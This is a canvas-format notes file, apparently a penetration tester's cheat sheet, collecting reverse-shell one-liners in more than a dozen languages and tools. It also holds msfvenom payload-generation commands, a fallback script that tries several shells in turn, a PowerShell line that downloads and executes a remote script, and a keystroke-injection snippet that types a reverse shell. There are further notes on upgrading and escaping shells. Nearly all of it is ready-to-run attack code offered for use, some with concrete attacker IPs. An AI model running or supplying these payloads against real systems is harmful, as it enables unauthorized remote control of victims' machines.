{
	"nodes":[
		{"id":"1630661b7234368c","type":"text","text":"# REVERSE SHELL\n# Bash TCP\n\n```bash\nbash -i >& /dev/tcp/<IP>/8080 0>&1\n\n0<&196;exec 196<>/dev/tcp/<IP>/<same unfiltered port>; sh <&196 >&196 2>&196\n```\n\n# Bash UDP\n\n```bash\nVictim:\nsh -i >& /dev/udp/<IP>/4242 0>&1\n\nListener:\nnc -u -lvp 4242\n```\n\n# Socat\n\n```powershell\nuser@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242\nuser@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:4242\n```\n\nStatic socat binary can be found at [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)\n\n# Perl\n\n```perl\nperl -e 'use Socket;$i=\"<IP>\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n\nperl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"[IPADDR]:[PORT]\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n\n\nNOTE: Windows only\nperl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"[IPADDR]:[PORT]\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n```\n\n# Python\n\nLinux only\n\nIPv4\n```python\nexport RHOST=\"<IP>\";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'\n```\n\nIPv4\n```python\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<IP>\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'\n```\n\nIPv6\n```python\npython -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(\"/bin/sh\");' \n```\n\n```python\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<IP>\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n```\n\nWindows only\n\n```powershell\nC:\\Python27\\python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('<IP>', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\"\n```\n\n# PHP\n\n```bash\nphp -r '$sock=fsockopen(\"192.202.138.2\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n```\n\n# Ruby\n\n```ruby\nruby -rsocket -e'f=TCPSocket.open(\"<IP>\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'\n\nruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"[IPADDR]\",\"[PORT]\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n\nNOTE: Windows only\nruby -rsocket -e 'c=TCPSocket.new(\"[IPADDR]\",\"[PORT]\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n```\n\n# Golang\n\n```bash\necho 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"192.168.0.134:8080\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go\n```\n\n# Netcat Traditional\n\n```bash\nnc -e /bin/sh [IPADDR] [PORT]\nnc.traditional -e /bin/bash <IP> 4444\n```\n\n# Netcat OpenBsd\n\n```bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 4444 >/tmp/f\n```\n\n# Ncat\n\n```bash\nncat <IP> 4444 -e /bin/bash\nncat --udp <IP> 4444 -e /bin/bash\n```\n\n# OpenSSL\n\n```powershell\nhacker@kali$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nhacker@kali$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242\nor\nhacker@kali$ ncat --ssl -vv -l -p 4242\n\nuser@company$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <IP>:4242 > /tmp/s; rm /tmp/s\n```\n\n# Powershell\n\n```powershell\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"10.10.20.10\",12345);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n```\n\n```powershell\npowershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('<IP>',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n```\n\n```powershell\npowershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')\n```\n\n# Awk\n\n```powershell\nawk 'BEGIN {s = \"/inet/tcp/0/<IP>>/4242\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null\n```\n\n# Java\n\n```java\nr = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/<IP>/4242;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()\n```\n\n# War\n\n```java\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4242 -f war > reverse.war\nstrings reverse.war | grep jsp # in order to get the name of the file\n```\n\n\n# Lua\n\nLinux only\n\n```powershell\nlua -e \"require('socket');require('os');t=socket.tcp();t:connect('<IP>','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');\"\n```\n\nWindows and Linux\n\n```powershell\nlua5.1 -e 'local host, port = \"<IP>\", 4444 local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'\n```\n\n# NodeJS\n\n```javascript\n(function(){\n    var net = require(\"net\"),\n        cp = require(\"child_process\"),\n        sh = cp.spawn(\"/bin/sh\", []);\n    var client = new net.Socket();\n    client.connect(4242, \"<IP>\", function(){\n        client.pipe(sh.stdin);\n        sh.stdout.pipe(client);\n        sh.stderr.pipe(client);\n    });\n    return /a/; // Prevents the Node.js application form crashing\n})();\n\n\nor\n\nrequire('child_process').exec('nc -e /bin/sh <IP> 4242')\n\nor\n\n-var x = global.process.mainModule.require\n-x('child_process').exec('nc <IP> 4242 -e /bin/bash')\n\nor\n\nhttps://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py\n```\n\n# Groovy\n\nby [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)\nNOTE: Java reverse shell also work for Groovy\n\n```javascript\nString host=\"localhost\";\nint port=8044;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n```\n\n","x":-185,"y":1312,"width":1885,"height":1888},
		{"id":"0b1367722e29ae13","type":"text","text":"# Example program to simulate keystrokes\nSometimes useful when want to copy and cant use any buffer\n```python\nimport pyautogui\nimport time\n\ndef simulate_keystrokes(interval=0.1):\n    text=\"\"\" php -r '$sock=fsockopen(\"192.202.138.2\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n \"\"\"\n    time.sleep(5)  # Give some time to switch to the text input field\n    pyautogui.typewrite(text, interval=interval)\n\n# Example usage:\nsimulate_keystrokes()\n```","x":-1360,"y":1312,"width":1140,"height":348},
		{"id":"61667172143e82d5","type":"text","text":"# Reverse Shell as a Service\nhttps://github.com/lukechilds/reverse-shell\n```bash\n# On your machine:\n$ /bin/bash -i # switch to bash before creating listener\n$ nc -l <port> # create listener\n```\n\n```bash\n#!/bin/bash\nIP=\"Attacker IP\"\nport=\"Attacker PORT\"\n\nif command -v python > /dev/null 2>&1; then\n    python -c \"import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('$IP',$port)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(['/bin/sh','-i']);\"\n    exit;\nfi\nif command -v perl > /dev/null 2>&1; then\n    perl -e \"\\$i='$IP';\\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\\$p,inet_aton(\\$i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};\"\n    exit;\nfi\nif command -v nc > /dev/null 2>&1; then\n    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $port >/tmp/f\n    exit;\nfi\nif command -v sh > /dev/null 2>&1; then\n    /bin/sh -i >& /dev/tcp/$IP/$port 0>&1\n    exit;\nfi\n```","x":-1360,"y":1760,"width":1140,"height":620},
		{"id":"a4944d824e1466a7","type":"text","text":"# Spawn a TTY shell from an interpreter\n\n```powershell\n/bin/sh -i\npython3 -c 'import pty;pty.spawn(\"/bin/sh\")'\npython3 -c \"__import__('pty').spawn('/bin/bash')\"\npython3 -c \"__import__('subprocess').call(['/bin/bash'])\"\nperl -e 'exec \"/bin/sh\";'\nperl: exec \"/bin/sh\";\nperl -e 'print `/bin/bash`'\nruby: exec \"/bin/sh\"\nlua: os.execute('/bin/sh')\n```\n# Escape restricted shell\nhttps://0xffsec.com/handbook/shells/restricted-shells/\n# Upgrade a Dumb Shell\n```bash\n# after gaining dummy reverse shell\n[Ctrl + z] # send shell to background\n$ stty size;stty raw -echo;fg # set up your shell to send control charcters and other raw input through the reverse shell\n[enter]...\n# in victim after foregrounding reverse shell\n$ export SHELL=bash\n$ stty rows $x columns $y #Set remote shell to x number of rows & y columns\n$ export TERM=xterm-256color #allows you to clear console, and have color output\n```\n\n## fast upgrade\n```bash\nstty size;stty raw -echo;fg\n```\n```bash\nexport SHELL=bash;stty rows 40 columns 150;export TERM=xterm-256color\n```","x":-1360,"y":2520,"width":1140,"height":900},
		{"id":"e416d10c68dce223","type":"text","text":"# References\n\n* [Reverse Bash Shell One Liner](https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner)\n* [Pentest Monkey - Cheat Sheet Reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)\n* [Spawning a TTY Shell](http://netsec.ws/?p=337)\n* [Obtaining a fully interactive shell](https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell)","x":-1094,"y":760,"width":637,"height":208},
		{"id":"a7eaee3be5f60597","type":"text","text":"## Other platforms\n\n```powershell\n$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f elf > shell.elf\n$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f exe > shell.exe\n$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f macho > shell.macho\n$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f asp > shell.asp\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<port> -f raw > shell.jsp\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<port> -f war > shell.war\n$ msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<port> -f raw > shell.py\n$ msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<port> -f raw > shell.sh\n$ msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<port> -f raw > shell.pl\n$ msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<port> -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\\n' > shell.php && pbpaste >> shell.php\n```\n","x":-180,"y":1024,"width":1280,"height":288},
		{"id":"e6f1243cfeca7571","type":"text","text":"# Reverse shell with msfvenom\n```bash\nnc -lvnp <port> # listener\n```\n```bash\n# All msfvenom shells to use with nc\nmsfvenom -l payloads | grep \"Creates an interactive shell\"\n```\n```bash\nmsfvenom -f raw -p cmd/unix/reverse... lhost=<IP> lport=<port> # reverse shell, requires listener first\nmsfvenom -f raw -p cmd/unix/bind... lhost=<IP> lport=<port> # creates listener to connetct to\nmsfvenom -f raw -p cmd/windows/reverse ...\n\n# interpreted payloads for languages\nmsfvenom -f raw -p python/shell/reverse # run in python interpreter\nmsfvenom -f raw -p php/reverse_php # run in php proces\n...\n\nmsfvenom -p cmd/unix/reverse_bash lhost=<IP> lport=<port> -f raw\nmsfvenom -p cmd/unix/reverse_python lhost=<IP> lport=<port> -f raw\nmsfvenom -p cmd/unix/reverse_netcat lhost=<IP> lport=<port> -f raw\nmsfvenom -p php/reverse_php lhost=<IP> lport=<port> -f raw\n...\n```\n```bash\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.10.10.110\" LPORT=4242 -f raw > shell.jsp\n```\n","x":-180,"y":480,"width":1020,"height":520}
	],
	"edges":[]
}